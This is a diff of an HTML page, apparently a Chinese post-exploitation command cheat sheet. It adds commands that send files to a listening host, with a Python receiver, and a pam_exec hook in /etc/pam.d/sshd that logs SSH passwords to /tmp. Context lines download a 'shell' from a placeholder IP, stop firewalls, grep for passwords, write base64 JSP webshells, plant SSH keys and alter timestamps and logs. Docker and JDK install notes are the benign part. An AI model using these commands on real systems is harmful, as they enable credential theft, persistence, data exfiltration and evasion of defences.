@@ -189,6 +189,30 @@
 
 
         
+            <!--
+
+-->
+
+<li>
+  <a href="../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/" class="side-bar__link ">
+    proxy tools
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/" class="side-bar__link ">
+    后渗透工具列表
+  </a>
+</li>
+
+
+        
     </ul>
   </li>
 
@@ -223,6 +247,18 @@
 <li>
   <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/" class="side-bar__link ">
     mysql
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/" class="side-bar__link ">
+    sql server
   </a>
 </li>
 
@@ -281,6 +317,9 @@
                 <li><a class="a" href="#curlwget">cURL/wget 下载文件</a></li>
                 
             
+                <li><a class="a" href="#curlwget_1">curl/wget 发送文件</a></li>
+                
+            
                 <li><a class="a" href="#_5">文件时间修改</a></li>
                 
             
@@ -303,6 +342,18 @@
                 
             
                 <li><a class="a" href="#_9">分割上传</a></li>
+                
+            
+                <li><a class="a" href="#_10">十六进制获取文件</a></li>
+                
+            
+                <li><a class="a" href="#pam_exec-ssh">pam_exec 抓 SSH 密码</a></li>
+                
+            
+                <li><a class="a" href="#debianubuntu-docker">Debian/Ubuntu Docker 安装</a></li>
+                
+            
+                <li><a class="a" href="#jdk">JDK 安装</a></li>
                 
             
           
@@ -355,6 +406,52 @@ cat tmp.log &gt; /var/log/nginx/access.log
 <pre><code>wget -P /tmp/ http://x.x.x.x:8080/shell
 curl -o /tmp/xxx http://x.x.x.x:8080/shell
 </code></pre>
+<h2 id="curlwget_1">curl/wget 发送文件</h2>
+<pre><code class="language-bash">curl -X POST --data-binary @file.txt http://localhost:9000
+
+wget --post-file=file.txt http://localhost:9000
+
+curl -T file.txt http://localhost:9000
+</code></pre>
+<pre><code class="language-python">import socket
+
+def start_server(host, port, buffer_size=1024):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(5)
+    print(f&quot;服务器正在 {host}:{port} 监听...&quot;)
+
+    while True:
+        client_socket, addr = server_socket.accept()
+        print(f&quot;连接来自 {addr}&quot;)
+
+        # 读取HTTP请求头
+        request = b&quot;&quot;
+        while b&quot;\r\n\r\n&quot; not in request:
+            request += client_socket.recv(buffer_size)
+
+        headers, file_data = request.split(b&quot;\r\n\r\n&quot;, 1)
+
+        # 提取文件名（可以根据实际需求修改提取方式）
+        file_name = &quot;received_file&quot;  # 默认文件名
+
+        # 保存文件
+        with open(file_name, 'wb') as f:
+            f.write(file_data)
+            while True:
+                data = client_socket.recv(buffer_size)
+                if not data:
+                    break
+                f.write(data)
+
+        print(f&quot;文件 {file_name} 已保存&quot;)
+        client_socket.close()
+
+if __name__ == &quot;__main__&quot;:
+    HOST = '0.0.0.0'
+    PORT = 9000
+    start_server(HOST, PORT)
+</code></pre>
 <h2 id="_5">文件时间修改</h2>
 <blockquote>
 <p>修改 /www/wwwroot/shell.php 时间为 2024.05.16.24</p>
@@ -365,7 +462,11 @@ curl -o /tmp/xxx http://x.x.x.x:8080/shell
 <pre><code>cat /etc/resolv.conf
 </code></pre>
 <h2 id="_6">停止防火墙</h2>
-<pre><code>systemctl stop firewalld &amp;&amp; service iptables stop &amp;&amp; ufw disable
+<pre><code>systemctl stop firewalld
+service iptables stop
+
+ubuntu:
+ufw disable
 </code></pre>
 <h2 id="_7">搜索敏感信息</h2>
 <pre><code>find / -regex &quot;.*\.properties\|.*\.conf\|.*\.config\|.*\.yaml\|.*\.sh|.*\.jsp|.*\.log|.*\.txt|.*\.xml&quot; | xargs grep -E &quot;=jdbc:|pass=|passwd=|aliyun|password&quot;
@@ -380,6 +481,7 @@ echo eHh4ZGFzMQ== | base64 -d &gt; /www/xxx.jsp
 //追加
 echo xxx &gt;&gt; /www/xxx.jsp
 </code></pre>
+<p>在线编码：https://forum.ywhack.com/coding.php</p>
 <h2 id="ssh">写入 ssh 公钥：</h2>
 <pre><code>echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d &gt; authorized_keys
 </code></pre>
@@ -408,6 +510,82 @@ type xaa xab &gt; fscan
 
 Linux 合并：
 cat xaa xab &gt; fscan
+</code></pre>
+<h2 id="_10">十六进制获取文件</h2>
+<pre><code># 将文件转换为十六进制
+xxd -p filename 
+</code></pre>
+<pre><code># 本地还原：
+xxd -p -r filename &gt; aa.tar.gz
+</code></pre>
+<h2 id="pam_exec-ssh">pam_exec 抓 SSH 密码</h2>
+<p>需要关闭 SELinux：</p>
+<pre><code>setenforce 0 # 关闭
+setenforce 1 # 开启
+</code></pre>
+<p>修改 <code>/etc/pam.d/sshd</code> 第一行添加：</p>
+<pre><code>auth optional pam_exec.so quiet expose_authtok /tmp/sshd.sh
+</code></pre>
+<p>/tmp/sshd.sh:</p>
+<blockquote>
+<p><code>chmod 777 /tmp/sshd.sh</code></p>
+</blockquote>
+<pre><code class="language-bash">#!/bin/sh
+
+echo &quot;$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER&quot; &gt;&gt; /tmp/123.log
+</code></pre>
+<h2 id="debianubuntu-docker">Debian/Ubuntu Docker 安装</h2>
+<blockquote>
+<p>Debian 12 / Ubuntu 24.04 安装 Docker 以及 Docker Compose</p>
+</blockquote>
+<p><strong>安装一些必要的软件包</strong></p>
+<pre><code>apt update
+apt upgrade -y
+apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates
+</code></pre>
+<p><strong>加入 Docker 的 GPG 公钥和 apt 源</strong></p>
+<pre><code>Debian:
+curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg
+echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list
+
+Ubuntu:
+curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg
+echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list
+</code></pre>
+<p>国内机器可以用清华 TUNA 的国内源:</p>
+<pre><code>Debian:
+curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg
+echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list
+
+Ubuntu:
+curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg
+echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu $(lsb_release -sc) stable&quot; &gt; /etc/apt/sources.list.d/docker.list
+</code></pre>
+<p>然后更新系统后即可安装 Docker CE 和 Docker Compose 插件</p>
+<pre><code>apt update
+apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin
+
+</code></pre>
+<p><strong>安装 Docker Compose</strong></p>
+<pre><code>curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-compose
+chmod +x /usr/local/bin/docker-compose
+
+</code></pre>
+<h2 id="jdk">JDK 安装</h2>
+<pre><code>ubuntu18运行
+sudo apt install openjdk-11-jre-headless
+sudo apt install openjdk-11-jdk
+</code></pre>
+<pre><code>手动
+tar -xzvf jdk-13.0.2_linux-x64_bin.tar.gz
+cd jdk-13.0.2/
+pwd
+vim /etc/profile
+
+export JAVA_HOME=/root/jdk-13.0.2
+export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/ export PATH=$PATH:$JAVA_HOME/bin
+
+source /etc/profile
 </code></pre>
               
             </div>
@@ -451,7 +629,7 @@ cat xaa xab &gt; fscan
 
   <!--
   MkDocs version      : 1.5.3
-  Docs Build Date UTC : 2024-07-09 15:06:35.699485+00:00
+  Docs Build Date UTC : 2024-07-11 13:53:22.946752+00:00
   -->
 
   <!--
@@ -506,7 +684,16 @@ cat xaa xab &gt; fscan
 
   }
   </script>
-
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?6c97fbf63dd98317dba802ddddaad905";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+  
 </div>
 </body>
 </html>
